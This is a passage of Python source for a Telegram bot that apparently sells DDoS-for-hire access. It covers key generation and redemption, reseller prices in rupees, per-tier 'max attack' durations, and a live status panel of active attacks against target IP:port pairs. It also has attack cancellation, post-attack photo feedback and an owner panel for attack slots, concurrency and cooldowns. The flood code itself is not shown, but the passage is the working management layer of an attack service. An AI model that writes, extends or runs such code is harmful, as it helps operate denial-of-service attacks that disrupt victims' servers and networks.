        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐅𝐢𝐫𝐬𝐭 𝐮𝐬𝐞 /delexpkey!</b>", reply_to=message)
        return

    expired_keys = pending_del_exp_key[user_id]
    del pending_del_exp_key[user_id]

    deleted_count = 0
    for key in expired_keys:
        try:
            keys_collection.delete_one({'key': key['key']})
            deleted_count += 1
        except:
            pass

    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>{deleted_count} 𝐞𝐱𝐩𝐢𝐫𝐞𝐝 𝐤𝐞𝐲𝐬 𝐝𝐞𝐥𝐞𝐭𝐞𝐝!</b>", reply_to=message)


@bot.message_handler(commands=["trail"])
def trail_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/trail &lt;hours&gt; &lt;max_users&gt;</code>\n\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: <code>/trail 1 10</code> (1 𝐡𝐨𝐮𝐫 𝐤𝐞𝐲 𝐟𝐨𝐫 10 𝐮𝐬𝐞𝐫𝐬)", reply_to=message)
        return

    try:
        hours = int(command_parts[1])
        max_users = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐡𝐨𝐮𝐫𝐬 𝐨𝐫 𝐦𝐚𝐱_𝐮𝐬𝐞𝐫𝐬!</b>", reply_to=message)
        return

    key = f"RAPID-X-{generate_key('TRAIL')}"

    key_doc = {
        'key': key,
        'duration_seconds': hours * 3600,
        'duration_label': f"{hours} hours (Trail)",
        'created_at': datetime.now(),
        'created_by': user_id,
        'created_by_type': 'owner',
        'used': False,
        'used_by': None,
        'used_at': None,
        'max_users': max_users,
        'current_users': 0,
        'is_trail': True,
        'key_type': 'NORMAL',
        'max_attack_time': 300
    }

    keys_collection.insert_one(key_doc)

    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐓𝐫𝐚𝐢𝐥 𝐊𝐞𝐲 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝!</b>\n\n{HTML_EMOJI.KEY} 𝐊𝐞𝐲: <code>{key}</code>\n{HTML_EMOJI.TIMER} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {hours} 𝐡𝐨𝐮𝐫𝐬\n{HTML_EMOJI.USERS} 𝐌𝐚𝐱 𝐔𝐬𝐞𝐫𝐬: {max_users}", reply_to=message)


# ============ PRICES COMMAND ============

@bot.message_handler(commands=["prices"])
def prices_command(message):
    if check_banned(message): return
    user_id = message.from_user.id

    if not is_reseller(user_id) and not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐢𝐬 𝐟𝐨𝐫 𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫𝐬 𝐨𝐧𝐥𝐲!</b>", reply_to=message)
        return

    response = "═══════════════════════════\n"
    response += f"{HTML_EMOJI.CREDIT} 𝐊𝐄𝐘 𝐏𝐑𝐈𝐂𝐈𝐍𝐆\n"
    response += "═══════════════════════════\n\n"

    response += f"{HTML_EMOJI.STAR} 𝐕𝐈𝐏 𝐊𝐄𝐘𝐒:\n"
    for dur, label in DURATION_LABELS.items():
        price = get_key_price('VIP', dur)
        response += f"   {label:<12} ➜  {price} 𝐑𝐬\n"

    response += f"\n{HTML_EMOJI.DOCUMENT} 𝐍𝐎𝐑𝐌𝐀𝐋 𝐊𝐄𝐘𝐒:\n"
    for dur, label in DURATION_LABELS.items():
        price = get_key_price('NORMAL', dur)
        response += f"   {label:<12} ➜  {price} 𝐑𝐬\n"

    response += "\n═══════════════════════════\n"
    response += f"{HTML_EMOJI.STAR} 𝐕𝐈𝐏 𝐌𝐀𝐗 𝐀𝐓𝐓𝐀𝐂𝐊: {get_key_max_attack('VIP')}s\n"
    response += f"{HTML_EMOJI.DOCUMENT} 𝐍𝐎𝐑𝐌𝐀𝐋 𝐌𝐀𝐗 𝐀𝐓𝐓𝐀𝐂𝐊: {get_key_max_attack('NORMAL')}s\n"
    response += "═══════════════════════════\n"
    response += f"{HTML_EMOJI.DOCUMENT} 𝐔𝐬𝐚𝐠𝐞: /gen (𝐭𝐡𝐞𝐧 𝐜𝐡𝐨𝐨𝐬𝐞 𝐤𝐞𝐲 𝐭𝐲𝐩𝐞)\n"
    response += "═══════════════════════════"

    safe_send_message(message.chat.id, response, reply_to=message)


# ============ REDEEM COMMAND ============

@bot.message_handler(commands=["redeem"])
def redeem_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/redeem &lt;key&gt;</code>", reply_to=message)
        return

    key_input = command_parts[1]

    key_doc = keys_collection.find_one({'key': key_input})

    if not key_doc:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐤𝐞𝐲!</b>", reply_to=message)
        return

    max_users = key_doc.get('max_users', 1)
    current_users = key_doc.get('current_users', 0)

    if key_doc['used'] and current_users >= max_users:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐛𝐞𝐞𝐧 𝐮𝐬𝐞𝐝!</b>", reply_to=message)
        return

    if key_doc.get('is_trail'):
        # ─── OWNER BYPASS ───
        if is_owner(user_id):
            pass  # Owner ko ban nahi karega
        else:
            user_data = users_collection.find_one({'user_id': user_id})
            if user_data and user_data.get('key_expiry') and user_data['key_expiry'] > datetime.now():
                abuse_count = user_data.get('trail_abuse_count', 0) + 1
                users_collection.update_one({'user_id': user_id}, {'$set': {'trail_abuse_count': abuse_count}})

                if abuse_count == 1:
                    safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} <b>𝐖𝐚𝐫𝐧𝐢𝐧𝐠: 𝐘𝐨𝐮 𝐜𝐚𝐧𝐧𝐨𝐭 𝐞𝐱𝐭𝐞𝐧𝐝 𝐲𝐨𝐮𝐫 𝐭𝐢𝐦𝐞 𝐰𝐢𝐭𝐡 𝐚 𝐭𝐫𝐚𝐢𝐥 𝐤𝐞𝐲!</b> 𝐀𝐧𝐨𝐭𝐡𝐞𝐫 𝐚𝐭𝐭𝐞𝐦𝐩𝐭 𝐦𝐚𝐲 𝐫𝐞𝐬𝐮𝐥𝐭 𝐢𝐧 𝐚 𝐛𝐚𝐧.", reply_to=message)
                else:
                    ban_minutes = 10 * (2 ** (abuse_count - 2))
                    ban_expiry = datetime.now() + timedelta(minutes=ban_minutes)
                    users_collection.update_one(
                        {'user_id': user_id},
                        {'$set': {'banned': True, 'ban_type': 'temporary', 'ban_expiry': ban_expiry}}
                    )
                    safe_send_message(message.chat.id, f"{HTML_EMOJI.BAN} <b>𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐛𝐚𝐧𝐧𝐞𝐝 𝐟𝐨𝐫 {ban_minutes} 𝐦𝐢𝐧𝐮𝐭𝐞𝐬 𝐝𝐮𝐞 𝐭𝐨 𝐭𝐫𝐚𝐢𝐥 𝐤𝐞𝐲 𝐚𝐛𝐮𝐬𝐞!</b>", reply_to=message)
                return

    user = users_collection.find_one({'user_id': user_id})

    reseller_username = key_doc.get('created_by_username') if key_doc.get('created_by_type') == 'reseller' else None
    key_type = key_doc.get('key_type', 'NORMAL')
    max_attack_time = key_doc.get('max_attack_time', get_key_max_attack(key_type))

    if user and user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + timedelta(seconds=key_doc['duration_seconds'])

        users_collection.update_one(
            {'user_id': user_id},
            {'$set': {
                'key': key_input,
                'key_expiry': new_expiry,
                'key_duration_seconds': key_doc['duration_seconds'],
                'key_duration_label': key_doc['duration_label'],
                'redeemed_at': datetime.now(),
                'reseller_username': reseller_username,
                'key_type': key_type,
                'max_attack_time': max_attack_time
            }}
        )

        new_current = current_users + 1
        if new_current >= max_users:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.now(), 'current_users': new_current}}
            )
        else:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used_at': datetime.now()}, '$inc': {'current_users': 1}}
            )

        new_remaining = get_time_remaining(user_id)
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐊𝐞𝐲 𝐄𝐱𝐭𝐞𝐧𝐝𝐞𝐝!</b>\n\n{HTML_EMOJI.KEY} 𝐊𝐞𝐲: <code>{key_input}</code>\n{HTML_EMOJI.STAR} 𝐓𝐲𝐩𝐞: {key_type}\n{HTML_EMOJI.TIMER} 𝐀𝐝𝐝𝐞𝐝: {key_doc['duration_label']}\n{HTML_EMOJI.TIMER} 𝐓𝐨𝐭𝐚𝐥 𝐓𝐢𝐦𝐞: {new_remaining}\n{HTML_EMOJI.FIRE} 𝐌𝐚𝐱 𝐀𝐭𝐭𝐚𝐜𝐤: {max_attack_time}s", reply_to=message)
    else:
        expiry_time = datetime.now() + timedelta(seconds=key_doc['duration_seconds'])

        users_collection.update_one(
            {'user_id': user_id},
            {'$set': {
                'user_id': user_id,
                'username': user_name,
                'key': key_input,
                'key_expiry': expiry_time,
                'key_duration_seconds': key_doc['duration_seconds'],
                'key_duration_label': key_doc['duration_label'],
                'redeemed_at': datetime.now(),
                'reseller_username': reseller_username,
                'key_type': key_type,
                'max_attack_time': max_attack_time
            }},
            upsert=True
        )

        new_current = current_users + 1
        if new_current >= max_users:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.now(), 'current_users': new_current}}
            )
        else:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used_at': datetime.now()}, '$inc': {'current_users': 1}}
            )

        remaining = get_time_remaining(user_id)
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐊𝐞𝐲 𝐑𝐞𝐝𝐞𝐞𝐦𝐞𝐝!</b>\n\n{HTML_EMOJI.KEY} 𝐊𝐞𝐲: <code>{key_input}</code>\n{HTML_EMOJI.STAR} 𝐓𝐲𝐩𝐞: {key_type}\n{HTML_EMOJI.TIMER} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {key_doc['duration_label']}\n{HTML_EMOJI.TIMER} 𝐓𝐢𝐦𝐞 𝐋𝐞𝐟𝐭: {remaining}\n{HTML_EMOJI.FIRE} 𝐌𝐚𝐱 𝐀𝐭𝐭𝐚𝐜𝐤: {max_attack_time}s", reply_to=message)


# ============ MY KEY COMMAND ============

@bot.message_handler(commands=["mykey"])
def my_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id

    user = users_collection.find_one({'user_id': user_id})

    if not user or not user.get('key'):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐘𝐨𝐮 𝐝𝐨𝐧'𝐭 𝐡𝐚𝐯𝐞 𝐚 𝐤𝐞𝐲!</b>", reply_to=message)
        return

    if not has_valid_key(user_id):
        reseller_username = user.get('reseller_username')
        if reseller_username:
            safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐊𝐞𝐲 𝐞𝐱𝐩𝐢𝐫𝐞𝐝!</b>\n\n{HTML_EMOJI.REFRESH} 𝐅𝐨𝐫 𝐫𝐞𝐧𝐞𝐰𝐚𝐥 𝐃𝐌: @{reseller_username}", reply_to=message)
        else:
            safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐊𝐞𝐲 𝐞𝐱𝐩𝐢𝐫𝐞𝐝!</b>", reply_to=message)
        return

    remaining = get_time_remaining(user_id)
    key_type = user.get('key_type', 'NORMAL')
    max_attack = user.get('max_attack_time', get_key_max_attack(key_type))

    safe_send_message(message.chat.id, f"{HTML_EMOJI.KEY} <b>𝐊𝐞𝐲 𝐃𝐞𝐭𝐚𝐢𝐥𝐬</b>\n\n{HTML_EMOJI.PIN} 𝐊𝐞𝐲: <code>{user['key']}</code>\n{HTML_EMOJI.STAR} 𝐓𝐲𝐩𝐞: {key_type}\n{HTML_EMOJI.TIMER} 𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠: {remaining}\n{HTML_EMOJI.FIRE} 𝐌𝐚𝐱 𝐀𝐭𝐭𝐚𝐜𝐤: {max_attack}s\n{HTML_EMOJI.CHECKMARK} 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐜𝐭𝐢𝐯𝐞", reply_to=message)


# ============================================================
# STATUS COMMAND - AUTO UPDATES EVERY 5 SECONDS
# ============================================================

@bot.message_handler(commands=["status"])
def status_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id

    is_group = message.chat.type in ['group', 'supergroup']
    group_id = message.chat.id if is_group else None

    if not is_owner(user_id):
        has_key = has_valid_key(user_id)

        group_approved = False
        if is_group and group_id:
            group_approved, _ = is_group_approved(group_id)

        if not has_key and not group_approved:
            safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐘𝐨𝐮 𝐧𝐞𝐞𝐝 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐤𝐞𝐲 𝐨𝐫 𝐛𝐞 𝐢𝐧 𝐚𝐧 𝐚𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐠𝐫𝐨𝐮𝐩 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝!</b>", reply_to=message)
            return

    status_msg = safe_send_message(message.chat.id, f"{HTML_EMOJI.REFRESH} 𝐅𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐥𝐢𝐯𝐞 𝐬𝐭𝐚𝐭𝐮𝐬.....", reply_to=message)

    if not status_msg:
        return

    def update_status():
        try:
            active_attacks_list = []
            with _attack_lock:
                now = datetime.now()
                for attack_id, attack in active_attacks.items():
                    if attack['end_time'] > now:
                        remaining = int((attack['end_time'] - now).total_seconds())
                        total = attack['duration']
                        elapsed = total - remaining
                        percentage = int((elapsed / total) * 100) if total > 0 else 0
                        active_attacks_list.append({
                            'target': attack.get('target'),
                            'port': attack.get('port'),
                            'remaining': remaining,
                            'percentage': percentage
                        })

            busy_slots, free_slots, total_slots = get_slot_status()
            active_groups = approved_groups_collection.count_documents({})
            private_users = bot_users_collection.count_documents({})
            blocked_ips_count = len(get_all_blocked_ips())

            response = "╔═════════════════════════╗\n"
            response += f"║             {HTML_EMOJI.FIRE} <b>𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐓𝐔𝐒</b> {HTML_EMOJI.FIRE}\n"
            response += "╠═════════════════════════╣\n"

            if active_attacks_list:
                response += f"║  {HTML_EMOJI.SHIELD} <b>𝐀𝐜𝐭𝐢𝐯𝐞 𝐀𝐭𝐭𝐚𝐜𝐤𝐬:</b> {len(active_attacks_list)}/{total_slots}\n"
                response += "╠═════════════════════════╣\n"
                for i, attack in enumerate(active_attacks_list, 1):
                    target_display = f"{attack['target']}:{attack['port']}"
                    if len(target_display) > 30:
                        target_display = target_display[:27] + "..."
                    progress_bar = create_progress_bar(attack['percentage'], 15)
                    response += f"║  {i}. {HTML_EMOJI.TARGET} {target_display:<30}\n"
                    response += f"║      {HTML_EMOJI.TIMER} 𝐓𝐢𝐦𝐞 𝐥𝐞𝐟𝐭: {attack['remaining']}s\n"
                    response += f"║      [{progress_bar}] {attack['percentage']}%\n"
                    if i < len(active_attacks_list):
                        response += "║─────────────────────────\n"
            else:
                response += f"║  {HTML_EMOJI.TIMER} <b>𝐍𝐨 𝐚𝐜𝐭𝐢𝐯𝐞 𝐚𝐭𝐭𝐚𝐜𝐤</b>\n"

            response += "╠═════════════════════════╣\n"
            response += f"║  {HTML_EMOJI.CHECKMARK} <b>𝐅𝐫𝐞𝐞 𝐒𝐥𝐨𝐭𝐬:</b> {free_slots}/{total_slots}\n"
            response += f"║  {HTML_EMOJI.CROSS} <b>𝐔𝐬𝐞𝐝 𝐒𝐥𝐨𝐭𝐬:</b> {busy_slots}/{total_slots}\n"
            response += "╚═════════════════════════╝\n"
            response += f"\n{HTML_EMOJI.USERS} <b>𝐀𝐜𝐭𝐢𝐯𝐞 𝐆𝐫𝐨𝐮𝐩𝐬:</b> {active_groups}\n"
            response += f"{HTML_EMOJI.PROFILE} <b>𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐔𝐬𝐞𝐫𝐬:</b> {private_users}\n"
            response += f"{HTML_EMOJI.BAN} <b>𝐁𝐥𝐨𝐜𝐤𝐞𝐝 𝐈𝐏𝐬:</b> {blocked_ips_count}\n"
            response += f"{HTML_EMOJI.SETTINGS} <b>𝐌𝐚𝐱 𝐓𝐢𝐦𝐞:</b> {get_max_attack_time()}s\n"
            response += f"{HTML_EMOJI.EXPLOSION} <b>𝐂𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭/𝐀𝐭𝐭𝐚𝐜𝐤:</b> {get_concurrent_limit()}\n\n"
            response += f"{HTML_EMOJI.REFRESH} <b>𝐀𝐮𝐭𝐨 𝐔𝐩𝐝𝐚𝐭𝐞 𝐒𝐲𝐬𝐭𝐞𝐦 𝐒𝐭𝐚𝐭𝐮𝐬 𝐄𝐯𝐞𝐫𝐲 𝟓 𝐒𝐞𝐜𝐨𝐧𝐝𝐬</b>"

            try:
                bot.edit_message_text(response, chat_id=message.chat.id, message_id=status_msg.message_id, parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            except:
                return

            with _attack_lock:
                has_active = False
                for attack in active_attacks.values():
                    if attack['end_time'] > datetime.now():
                        has_active = True
                        break

            if has_active:
                threading.Timer(5.0, update_status).start()

        except:
            pass

    update_status()


# ============ OTHER COMMANDS (cancel, myaccess, photo feedback) ============

@bot.message_handler(commands=["cancel"])
def cancel_attack_command(message):
    user_id = message.from_user.id

    if check_banned(message): return

    with _attack_lock:
        found = False
        for attack_id, attack in list(active_attacks.items()):
            if attack.get('user_id') == user_id:
                del active_attacks[attack_id]
                if attack_id in api_in_use:
                    del api_in_use[attack_id]
                if attack_id in active_port_attacks:
                    del active_port_attacks[attack_id]
                found = True
                break

        if found:
            safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐘𝐨𝐮𝐫 𝐚𝐜𝐭𝐢𝐯𝐞 𝐚𝐭𝐭𝐚𝐜𝐤 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐜𝐚𝐧𝐜𝐞𝐥𝐥𝐞𝐝!</b>", reply_to=message)
        else:
            safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐧𝐨 𝐚𝐜𝐭𝐢𝐯𝐞 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐨 𝐜𝐚𝐧𝐜𝐞𝐥!</b>", reply_to=message)


@bot.message_handler(commands=["myaccess"])
def my_access_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id

    user = users_collection.find_one({'user_id': user_id})

    if not user or not user.get('key'):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐘𝐨𝐮 𝐝𝐨𝐧'𝐭 𝐡𝐚𝐯𝐞 𝐚𝐧𝐲 𝐚𝐜𝐭𝐢𝐯𝐞 𝐚𝐜𝐜𝐞𝐬𝐬!</b>", reply_to=message)
        return

    if not has_valid_key(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐘𝐨𝐮𝐫 𝐚𝐜𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝!</b>", reply_to=message)
        return

    remaining = get_time_remaining(user_id)
    reseller_name = user.get('reseller_username', 'None')
    key_type = user.get('key_type', 'NORMAL')
    max_attack = user.get('max_attack_time', get_key_max_attack(key_type))

    access_msg = f"{HTML_EMOJI.DOCUMENT} <b>𝐘𝐨𝐮𝐫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐭𝐚𝐢𝐥𝐬</b>\n\n{HTML_EMOJI.KEY} 𝐊𝐞𝐲: <code>{user['key']}</code>\n{HTML_EMOJI.STAR} 𝐓𝐲𝐩𝐞: {key_type}\n{HTML_EMOJI.TIMER} 𝐓𝐢𝐦𝐞 𝐋𝐞𝐟𝐭: {remaining}\n{HTML_EMOJI.FIRE} 𝐌𝐚𝐱 𝐀𝐭𝐭𝐚𝐜𝐤: {max_attack}s\n{HTML_EMOJI.STORE} 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫: @{reseller_name}\n{HTML_EMOJI.CHECKMARK} 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐜𝐭𝐢𝐯𝐞"

    safe_send_message(message.chat.id, access_msg, reply_to=message)


@bot.message_handler(content_types=['photo'])
def handle_feedback_photo(message):
    user_id = message.from_user.id
    is_group = message.chat.type in ['group', 'supergroup']
    group_id = message.chat.id if is_group else None

    fb = get_pending_feedback(user_id, is_group, group_id)
    if not fb:
        return

    clear_pending_feedback(user_id, is_group, group_id)

    user_name = message.from_user.first_name
    username = message.from_user.username or "N/A"

    attack_type = "𝐆𝐑𝐎𝐔𝐏" if is_group else "𝐏𝐑𝐈𝐕𝐀𝐓𝐄"
    location = f"𝐆𝐫𝐨𝐮𝐩 𝐈𝐃: {group_id}" if is_group else "𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐭"

    safe_send_message(message.chat.id,
        f"{HTML_EMOJI.CHECKMARK} <b>𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{HTML_EMOJI.PARTY} 𝐓𝐡𝐚𝐧𝐤 𝐲𝐨𝐮 𝐟𝐨𝐫 𝐲𝐨𝐮𝐫 𝐟𝐞𝐞𝐝𝐛𝐚𝐜𝐤!\n"
        f"{HTML_EMOJI.FIRE} <b>𝐘𝐨𝐮 𝐜𝐚𝐧 𝐧𝐨𝐰 𝐬𝐭𝐚𝐫𝐭 𝐚 𝐧𝐞𝐰 𝐚𝐭𝐭𝐚𝐜𝐤 𝐮𝐬𝐢𝐧𝐠 /attack 𝐜𝐨𝐦𝐦𝐚𝐧𝐝.</b>",
        reply_to=message, parse_mode="HTML")

    caption = (
        f"{HTML_EMOJI.CAMERA} <b>𝐍𝐄𝐖 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{HTML_EMOJI.PROFILE} <b>𝐔𝐬𝐞𝐫:</b> {user_name}\n"
        f"{HTML_EMOJI.PROFILE} <b>𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞:</b> @{username}\n"
        f"{HTML_EMOJI.PROFILE} <b>𝐈𝐃:</b> <code>{user_id}</code>\n"
        f"{HTML_EMOJI.LINK} <b>𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧:</b> {location}\n"
        f"{HTML_EMOJI.STATS} <b>𝐓𝐲𝐩𝐞:</b> {attack_type}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{HTML_EMOJI.TARGET} <b>𝐓𝐚𝐫𝐠𝐞𝐭:</b> <code>{fb['target']}:{fb['port']}</code>\n"
        f"{HTML_EMOJI.TIMER} <b>𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧:</b> <code>{fb['duration']}s</code>\n"
        f"{HTML_EMOJI.TIMER} <b>𝐓𝐢𝐦𝐞:</b> <code>{datetime.now().strftime('%d-%m-%Y %H:%M:%S')}</code>"
    )

    try:
        bot.send_photo(
            chat_id=FEEDBACK_CHANNEL_ID,
            photo=message.photo[-1].file_id,
            caption=caption,
            parse_mode="HTML"
        )
        print(f"[Feedback] Auto-forwarded to channel: {FEEDBACK_CHANNEL_ID}")
    except Exception as e:
        print(f"[Feedback channel error] {e}")

    if BOT_OWNER:
        try:
            for owner in BOT_OWNER:
                if bot:
                    bot.send_photo(
                        chat_id=owner,
                        photo=message.photo[-1].file_id,
                        caption=caption,
                        parse_mode="HTML"
                    )
        except Exception as e:
            print(f"[Feedback owner error] {e}")


# ============ OWNER PANEL ============

@bot.message_handler(commands=["owner"])
def owner_settings_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        return

    help_text = f'''
{HTML_EMOJI.CROWN} <b>𝐎𝐖𝐍𝐄𝐑 𝐏𝐀𝐍𝐄𝐋</b>

𝐔𝐬𝐞 /config 𝐭𝐨 𝐨𝐩𝐞𝐧 𝐭𝐡𝐞 𝐢𝐧𝐭𝐞𝐫𝐚𝐜𝐭𝐢𝐯𝐞 𝐜𝐨𝐧𝐟𝐢𝐠𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐩𝐚𝐧𝐞𝐥.

{HTML_EMOJI.DOCUMENT} <b>𝐐𝐔𝐈𝐂𝐊 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:</b>

{HTML_EMOJI.BAN} <b>𝐈𝐏 𝐁𝐋𝐎𝐂𝐊𝐈𝐍𝐆:</b>
• /blockip &lt;prefix&gt; - 𝐁𝐥𝐨𝐜𝐤 𝐈𝐏 𝐩𝐫𝐞𝐟𝐢𝐱
• /unblockip &lt;prefix&gt; - 𝐔𝐧𝐛𝐥𝐨𝐜𝐤 𝐈𝐏 𝐩𝐫𝐞𝐟𝐢𝐱
• /blockedips - 𝐋𝐢𝐬𝐭 𝐚𝐥𝐥 𝐛𝐥𝐨𝐜𝐤𝐞𝐝 𝐈𝐏𝐬

{HTML_EMOJI.SETTINGS} <b>𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒:</b>
• /setmaxslot &lt;slots&gt; - 𝐒𝐞𝐭 𝐦𝐚𝐱 𝐬𝐢𝐦𝐮𝐥𝐭𝐚𝐧𝐞𝐨𝐮𝐬 𝐚𝐭𝐭𝐚𝐜𝐤𝐬
• /setconcurrent &lt;value&gt; - 𝐒𝐞𝐭 𝐜𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐩𝐞𝐫 𝐚𝐭𝐭𝐚𝐜𝐤
• /maxattack &lt;sec&gt; - 𝐒𝐞𝐭 𝐦𝐚𝐱 𝐭𝐢𝐦𝐞 𝐟𝐨𝐫 𝐧𝐨𝐫𝐦𝐚𝐥 𝐤𝐞𝐲𝐬
• /cooldown &lt;sec&gt; - 𝐒𝐞𝐭 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧

{HTML_EMOJI.KEY} <b>𝐊𝐄𝐘 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓:</b>
• /gen - 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐤𝐞𝐲𝐬 (𝐜𝐡𝐨𝐨𝐬𝐞 𝐕𝐈𝐏/𝐍𝐎𝐑𝐌𝐀𝐋)
• /key &lt;key&gt; - 𝐊𝐞𝐲 𝐝𝐞𝐭𝐚𝐢𝐥𝐬
• /allkeys - 𝐀𝐥𝐥 𝐤𝐞𝐲𝐬
• /delkey &lt;key&gt; - 𝐃𝐞𝐥𝐞𝐭𝐞 𝐤𝐞𝐲
• /delexpkey - 𝐃𝐞𝐥𝐞𝐭𝐞 𝐞𝐱𝐩𝐢𝐫𝐞𝐝 𝐤𝐞𝐲𝐬
• /trail &lt;hrs&gt; &lt;max&gt; - 𝐓𝐫𝐚𝐢𝐥 𝐤𝐞𝐲𝐬

{HTML_EMOJI.USERS} <b>𝐔𝐒𝐄𝐑 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓:</b>
• /allusers - 𝐀𝐥𝐥 𝐮𝐬𝐞𝐫𝐬
• /extend &lt;id&gt; &lt;time&gt; - 𝐄𝐱𝐭𝐞𝐧𝐝 𝐭𝐢𝐦𝐞
• /extendall &lt;time&gt; - 𝐄𝐱𝐭𝐞𝐧𝐝 𝐞𝐯𝐞𝐫𝐲𝐨𝐧𝐞'𝐬 𝐭𝐢𝐦𝐞
• /down &lt;id&gt; &lt;time&gt; - 𝐑𝐞𝐝𝐮𝐜𝐞 𝐭𝐢𝐦𝐞
• /ban &lt;id&gt; - 𝐁𝐚𝐧 𝐮𝐬𝐞𝐫
• /unban &lt;id&gt; - 𝐔𝐧𝐛𝐚𝐧 𝐮𝐬𝐞𝐫
• /tban &lt;id&gt; &lt;time&gt; - 𝐓𝐞𝐦𝐩 𝐛𝐚𝐧

